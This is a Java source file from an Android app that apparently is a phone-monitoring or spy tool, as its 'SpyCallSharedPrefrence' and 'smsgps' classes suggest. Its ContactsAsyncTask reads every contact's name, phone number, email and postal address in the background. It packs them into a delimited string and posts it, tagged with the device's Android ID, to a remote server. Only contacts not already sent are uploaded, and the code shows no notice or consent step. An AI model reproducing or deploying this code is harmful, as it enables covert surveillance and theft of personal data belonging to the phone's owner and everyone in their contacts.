/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.io.InputStream;

import org.json.JSONArray;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

public class ContactsAsyncTask extends AsyncTask<String, Void, String> {
	
	private static final String TAG = "ContactsAsyncTask";
	private Context ctx;
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;	
	String CallDetailList="";
	String displayName = "", emailAddress = "", phoneNumber = "",UserAddress = "";
	
	/**
	 * 
	 */
	public ContactsAsyncTask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected final String doInBackground(String... params) {
		
		try{
			getContactList();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedContacts();
		}
		
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}
	
	/********************geCallList Start****************************
	 * 
	 * Get all Contact name with contact number
	 * 
	 * **************************************************************/
	private void getContactList() {
		
		try {

			CallDetailList = "";
			ContentResolver cr = ctx.getContentResolver();
			Cursor CursorPhones = ctx.getContentResolver().query(
					ContactsContract.Contacts.CONTENT_URI, null, null, null,
					null);
			int PreCallListCount = SpyCallSharedPrefrence.getsaveCONTACT_LISTCount(ctx);
			int getTotalCount = CursorPhones.getCount();
			int remaningContactList = getTotalCount - PreCallListCount;
			if (remaningContactList != 0) {
				Log.d("PreCallListCount", PreCallListCount + " getTotalCount: "
						+ getTotalCount + " remaningContactList: "
						+ remaningContactList);

				Cursor cursor = ctx.getContentResolver().query(
						ContactsContract.Contacts.CONTENT_URI,
						null,
						null,
						null,
						ContactsContract.Contacts._ID + " LIMIT "
								+ PreCallListCount + "," + remaningContactList);
				
				Bitmap photo = null;
				
				/*
				 * ContentResolver cr =getContentResolver(); Cursor cursor =
				 * cr.query(ContactsContract.Contacts.CONTENT_URI, null, null,
				 * null, null);
				 */

				while (cursor.moveToNext()) {
					displayName = "";
					emailAddress = "";
					phoneNumber = "";
					UserAddress = "";
					displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
					String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
					
					  try {
					        Cursor cur = this.ctx.getContentResolver().query(
					                ContactsContract.Data.CONTENT_URI,
					                null,
					                ContactsContract.Data.CONTACT_ID + "=" + id + " AND "
					                        + ContactsContract.Data.MIMETYPE + "='"
					                        + ContactsContract.CommonDataKinds.Photo.CONTENT_ITEM_TYPE + "'", null,
					                null);
					        if (cur != null) {
					            if (!cur.moveToFirst()) {
					            }
					        } else {
					        }
					    } catch (Exception e) {
					        e.printStackTrace();
					    }
					    Uri person = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, Long.parseLong(id));
					    
					    System.out.println(Uri.withAppendedPath(person, ContactsContract.Contacts.Photo.CONTENT_DIRECTORY)); 
					  //  return Uri.withAppendedPath(person, ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);
					    
					    try {
							InputStream inputStream = ContactsContract.Contacts.openContactPhotoInputStream(ctx.getContentResolver(),
											ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,new Long(id)));
							if (inputStream != null) {
								photo = BitmapFactory.decodeStream(inputStream);
								//ImageView imageView = (ImageView) findViewById(R.id.img_contact);
								//imageView.setImageBitmap(photo);
								inputStream.close();
							}
							//assert inputStream != null;
							//inputStream.close();
						} catch (Exception e) {
							e.printStackTrace();
						}
					/*******************************/
					/*
					 * Cursor Organization1 =
					 * cr.query(ContactsContract.Contacts.
					 * CONTENT_URI,null,ContactsContract
					 * .CommonDataKinds.Organization.CONTACT_ID + " = " + id,
					 * null, null); while (Organization1.moveToNext()) {
					 * OrganizationAdd =
					 * Organization1.getString(Organization1.getColumnIndex
					 * (Organization.COMPANY)); break; } Organization1.close();
					 */
					/*******************************/
					Cursor Address = cr.query(StructuredPostal.CONTENT_URI,null, StructuredPostal.CONTACT_ID + " = " + id,null, null);
					while (Address.moveToNext()) {
						UserAddress = Address.getString(Address.getColumnIndex(StructuredPostal.DATA));
						break;
					}
					Address.close();
					/*******************************/
					Cursor emails = cr.query(Email.CONTENT_URI, null,Email.CONTACT_ID + " = " + id, null, null);
					while (emails.moveToNext()) {
						emailAddress = emails.getString(emails.getColumnIndex(Email.DATA));
						break;
					}
					emails.close();
					if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
						Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID+ " = ?", new String[] { id },null);
						while (pCur.moveToNext()) {
							phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
							break;
						}
						pCur.close();
					}
				     
					// firstname|||phone|||mobile|||emailAdd|||orgStr|||jobTitleStr|||dateStr|||Address|||ZipCode
					String strCall = Uri.encode(displayName) + "|||" + ""
							+ "|||" + phoneNumber + "|||"
							+ Uri.encode(emailAddress) + "|||" + Uri.encode("")
							+ "|||" + Uri.encode("") + "|||" + Uri.encode("")
							+ "|||" + Uri.encode(UserAddress) + "|||"
							+ Uri.encode("");

					if (CallDetailList.length() != 0) {
						CallDetailList = strCall + "##KM##" + CallDetailList;
					} else {
						CallDetailList = strCall;
					}
				}
				cursor.close();

				int total = PreCallListCount + remaningContactList;
				remaningContactList = 0;
				if (Utility.isNetworkAvailable(ctx)) {
					//new YourAsyncTask_ContactList().execute(CallDetailList, ""+ total);
					new ContactAsyncTaskPost().execute(""+total,CallDetailList);
				}
			} else {
				
			}
		} catch (Exception e) {
			e.printStackTrace();
			
		}
}
	
	/**
	 * posting data on server
	 */
	class ContactAsyncTaskPost extends AsyncTask<String, Void, Void> {

		private String getResponceCantactList;
		
		/**
		 * 
		 */
		public ContactAsyncTaskPost() {
		}
		
		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params) {        
			//make your request here - it will run in a different thread
			try{
				mRequestPostClass=new RequestPost();				
				String getUserID_SP = HinjAppPreferenceUtils.getRaId(ctx);
				String upload_device_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
				HinjAppPreferenceUtils.setUploadDeviceID(ctx, upload_device_id);
				//String upload_device_id = HinjAppPreferenceUtils.getUploadDeviceID(ctx);
				getResponceCantactList=mRequestPostClass.postCallList(params[1],getUserID_SP,upload_device_id);
				
				final JSONObject responseObject = new JSONObject(getResponceCantactList);
				final JSONArray responseArray = responseObject.getJSONArray("contact");
				if(responseArray.getJSONObject(0).toString().contains("success")){		
					SpyCallSharedPrefrence.saveCONTACT_LISTCount(ctx,Integer.parseInt(params[0]));
				}
			}
			catch (Exception e) {
				e.printStackTrace();
			}

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			// progressDialog1.dismiss();
			Log.i(TAG,getResponceCantactList);
			//getSms();
			//onComplete.onCompletedContacts();
		}
	}	

	/********************geCallList End******************************/
}
